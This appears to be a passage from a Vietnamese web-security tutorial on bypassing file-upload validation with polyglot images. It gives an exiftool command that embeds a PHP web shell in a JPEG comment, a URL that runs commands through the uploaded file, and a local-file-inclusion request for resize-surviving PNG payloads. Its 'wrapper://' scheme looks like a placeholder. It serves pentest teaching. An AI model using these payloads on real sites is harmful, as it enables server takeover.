# Flawed Validation (Lỗi xác thực nội dung tệp)

## Mô tả

Thay vì tin tưởng một cách ngầm định vào thông tin `Content-Type` được chỉ định trong yêu cầu, các máy chủ bảo mật hơn sẽ cố gắng xác minh xem nội dung của tệp có thực sự khớp với những gì được mong đợi hay không.

Trong trường hợp chức năng tải ảnh lên, máy chủ có thể cố gắng xác minh một số thuộc tính nội tại của ảnh, chẳng hạn như kích thước. Ví dụ, nếu bạn cố gắng tải lên một tập lệnh PHP, nó sẽ không có bất kỳ kích thước nào. Do đó, máy chủ có thể suy ra rằng nó không thể là một hình ảnh và từ chối việc tải lên.

Tương tự, một số loại tệp nhất định luôn chứa một chuỗi byte cụ thể trong phần đầu hoặc cuối tệp (Magic Bytes). Những chuỗi byte này có thể được sử dụng như dấu vân tay hoặc chữ ký để xác định xem nội dung có khớp với loại tệp dự kiến ​​hay không. Ví dụ, các tệp JPEG luôn bắt đầu bằng các byte `FF D8 FF`.

Tuy nhiên, ngay cả phương pháp này cũng không hoàn toàn an toàn. Sử dụng các công cụ đặc biệt, chẳng hạn như ExifTool, việc tạo ra một tệp JPEG đa ngôn ngữ (polyglot) chứa mã độc hại trong siêu dữ liệu của nó là điều rất dễ dàng.

### Các bước thực hiện

Để khai thác lỗ hổng này bằng cách tạo một file Polyglot (vừa là ảnh hợp lệ, vừa chứa mã độc PHP):

1.  **Chuẩn bị**:

    - Một file ảnh hợp lệ (ví dụ: `image.jpg`).
    - Công cụ `ExifTool`.

2.  **Chèn Payload vào Metadata**:
    Sử dụng ExifTool để chèn mã PHP vào phần Comment (hoặc các thẻ metadata khác) của ảnh.

    ```bash
    exiftool -Comment="<?php echo 'Command Execution: '; system(\$_GET['cmd']); ?>" image.jpg -o payload.php
    ```

    _Lệnh này sẽ tạo ra file `payload.php` vẫn giữ nguyên cấu trúc của ảnh JPEG (có magic bytes `FF D8 FF`) nhưng chứa mã PHP trong phần comment._

3.  **Tải lên (Upload)**:

    - Tải file `payload.php` lên chức năng upload của trang web.
    - Vì file có magic bytes của JPEG và có kích thước ảnh hợp lệ, nó có thể vượt qua các bộ lọc kiểm tra nội dung (Content Validation).

4.  **Thực thi (Execute)**:
    - Truy cập đường dẫn của file đã upload.
    - Ví dụ: `http://target-site.com/uploads/payload.php?cmd=id`
    - Server sẽ xử lý file như một script PHP (do đuôi .php) và thực thi mã độc nằm trong metadata.

---

## 3. Kỹ thuật Nâng cao: Bypass Image Resizing (Vượt qua cơ chế đổi kích thước ảnh)

### Mô tả

Nhiều server bảo mật sẽ thực hiện **thay đổi kích thước (resize)** hoặc nén lại ảnh ngay sau khi nhận được. Quá trình này sẽ tạo ra một file ảnh hoàn toàn mới và loại bỏ toàn bộ Metadata (Exif, Comment) chứa mã độc ở phần trên.

**(Lưu ý: Kỹ thuật này thường cần kết hợp với lỗ hổng Local File Inclusion - LFI để thực thi mã).**

### Cơ chế tấn công

Kẻ tấn công cần chèn mã độc vào các phần dữ liệu **bắt buộc** của ảnh (như `IDAT chunk` trong PNG hoặc `DCT` trong JPG) thay vì Metadata. Khi thư viện ảnh (như GD Library của PHP, ImageMagick) thực hiện resize, nó vẫn phải giữ lại các dữ liệu hình ảnh này, và vô tình giữ lại luôn mã độc.

### Các bước thực hiện

#### Bước 1: Chuẩn bị công cụ

Sử dụng các công cụ chuyên dụng để tạo ảnh "Persistent Polyglot" (Polyglot bền vững).

- **JPG:** Sử dụng `jpg_payload` hoặc `Drunken Bishop`.
- **PNG:** Sử dụng `IDAT Injection` (chèn code vào các khối dữ liệu nén).

#### Bước 2: Tạo Payload (Ví dụ với PNG IDAT)

Mục tiêu là tạo ra một file PNG mà khi đi qua hàm `imagecreatefrompng()` và `imagepng()` của PHP, payload PHP shell vẫn còn nguyên vẹn.

_(Code tạo payload này khá phức tạp, thường sử dụng script có sẵn như `png-idat-payload.php`)_.

#### Bước 3: Upload

Tải file ảnh hợp lệ (ví dụ `avatar.png`) chứa payload lên server. Server sẽ resize ảnh và lưu lại thành `avatar_resized.png`.

#### Bước 4: Khai thác qua LFI

Vì file trên server vẫn có đuôi là `.png` và header là ảnh, bạn không thể chạy nó trực tiếp. Bạn cần tìm một lỗi **Local File Inclusion (LFI)** trên web để "include" file ảnh này vào.

**Payload LFI:**

```http
GET /index.php?page=wrapper://uploads/avatar_resized.png&cmd=id
```

Khi được include, PHP sẽ phân tích nội dung file ảnh, tìm thấy đoạn mã `<?php ... ?>` còn sót lại trong IDAT chunk và thực thi nó.
